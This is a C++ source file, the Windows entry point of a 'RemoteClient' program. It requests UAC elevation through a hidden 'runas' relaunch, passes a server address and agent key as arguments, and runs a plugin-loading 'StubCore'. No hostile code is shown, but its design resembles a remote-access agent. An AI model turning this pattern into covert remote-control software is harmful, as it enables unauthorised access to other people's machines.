#include "StubCore.h"
#include "Logger.h"
#include <windows.h>
#include <filesystem>
#include <exception>
#include <cstdlib>
#include <cstring>

// 检查是否以管理员权限运行
static bool IsRunAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = nullptr;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(nullptr, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin != FALSE;
}

// UAC 提权：用 ShellExecute runas 重新启动自身
// 注意：ShellExecute 不继承环境变量，R6M_SERVER/R6M_AGENT_KEY 需转为命令行参数传递
static void ElevateToAdmin() {
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    // 获取命令行参数（保留 --server 等）
    std::wstring params = GetCommandLineW();
    // Skip leading executable name if quoted/unquoted
    if (!params.empty() && params[0] == L'"') {
        auto end = params.find(L'"', 1);
        params = (end == std::wstring::npos) ? L"" : params.substr(end + 1);
    } else {
        auto end = params.find(L' ');
        params = (end == std::wstring::npos) ? L"" : params.substr(end + 1);
    }
    // 环境变量提升后丢失：转为参数传递（仅当命令行里没有显式指定时）
    {
        auto hasFlag = [&](const wchar_t* flag) {
            return params.find(flag) != std::wstring::npos;
        };
        if (const char* srv = getenv("R6M_SERVER")) {
            if (!hasFlag(L"--server")) {
                std::wstring w(srv, srv + strlen(srv));
                params += L" --server " + w;
            }
        }
        if (const char* key = getenv("R6M_AGENT_KEY")) {
            if (!hasFlag(L"--agent-key")) {
                std::wstring w(key, key + strlen(key));
                params += L" --agent-key " + w;
            }
        }
    }
    LOG_INFO("Main", "Requesting admin elevation (UAC)...");
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas";
    sei.lpFile = exePath;
    sei.lpParameters = params.c_str();  // 参数 + 环境变量转换值
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    if (ShellExecuteExW(&sei)) {
        // 新进程已启动，当前进程退出
        LOG_INFO("Main", "Admin process launched, exiting current non-admin instance");
        ExitProcess(0);
    } else {
        // 用户拒绝了 UAC，继续以普通权限运行（IPv6 路由配置会失败）
        LOG_WARN("Main", "UAC denied by user, running without admin (IPv6 routes may fail)");
    }
}

int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int) {
    SetConsoleOutputCP(65001);

    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    std::wstring appDir = std::wstring(exePath);
    appDir = appDir.substr(0, appDir.find_last_of(L'\\'));

    Logger::instance().init((appDir + L"\\client.log").c_str());
    LOG_INFO("Main", "====== RemoteClient starting ======");

    // UAC 提权检查
    if (!IsRunAsAdmin()) {
        LOG_INFO("Main", "Not running as admin, requesting elevation...");
        ElevateToAdmin();
        // 如果 ShellExecuteExW 失败（用户拒绝），继续以普通权限运行
    } else {
        LOG_INFO("Main", "Running as admin");
    }

    std::wstring pluginDir = appDir + L"\\plugins";

    try {
        LOG_INFO("Main", "Creating StubCore...");
        StubCore stub;
        LOG_INFO("Main", "StubCore created, calling run...");
        stub.run(pluginDir);
        LOG_INFO("Main", "StubCore exited");
    } catch (const std::exception& e) {
        LOG_ERROR("Main", ("EXCEPTION: " + std::string(e.what())).c_str());
    } catch (...) {
        LOG_ERROR("Main", "EXCEPTION: unknown");
    }

    LOG_INFO("Main", "====== RemoteClient finished ======");
    return 0;
}
